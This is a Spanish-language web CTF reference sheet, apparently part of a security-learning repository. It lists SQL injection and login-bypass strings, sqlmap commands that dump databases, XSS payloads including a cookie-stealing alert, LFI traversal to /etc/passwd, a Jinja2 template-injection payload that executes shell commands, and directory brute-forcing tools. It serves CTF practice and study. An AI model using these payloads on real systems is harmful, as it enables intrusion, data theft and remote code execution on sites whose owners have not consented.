# 🌐 Guía de referencia web para CTF

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Web-CTF.tr.md) • [🇬🇷 Ελληνικά](Web-CTF.el.md)

---

## 💉 Inyección SQL

### Payloads básicos
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

---

## 📜 XSS (Cross-Site Scripting)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

## 📁 LFI (Local File Inclusion: inclusión de archivos locales)

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

## 🔧 SSTI (Server-Side Template Injection: inyección en plantillas del servidor)

### Detección
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Jinja2 RCE
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔐 Evasión de autenticación

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Password: ' OR '1'='1
```

---

## 🍪 Cookie/JWT

> **Aclaración:** un JWT completo no se decodifica como un único bloque Base64. Sus partes usan Base64url; decodificar el contenido no verifica la firma. `eyJ...` es un marcador incompleto. Véase [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519.html).

```bash
# Decodificar JWT
echo "eyJ..." | base64 -d

# Herramientas
jwt_tool.py token
jwt.io (online)
```

---

## 🛠️ Herramientas útiles

```bash
# Fuerza bruta de directorios
gobuster dir -u http://url -w wordlist.txt

# Fuzzing (pruebas con entradas variadas)
ffuf -u http://url/FUZZ -w wordlist.txt

# Descubrimiento de parámetros
arjun -u http://url
```

---

## 📋 Lista de comprobación de CTF web

```markdown
□ Comprobar el código fuente (Ctrl+U)
□ Comprobar robots.txt y sitemap.xml
□ Comprobar cookies y JWT
□ Probar SQLi en las entradas
□ Probar XSS en las entradas
□ Probar LFI en los parámetros de archivos
□ Comprobar SSTI
□ Fuerza bruta de directorios
□ Comprobar si hay un directorio .git expuesto
```

---

**Volver a CTF:** [🏁 Resumen de CTF](./README.es.md)
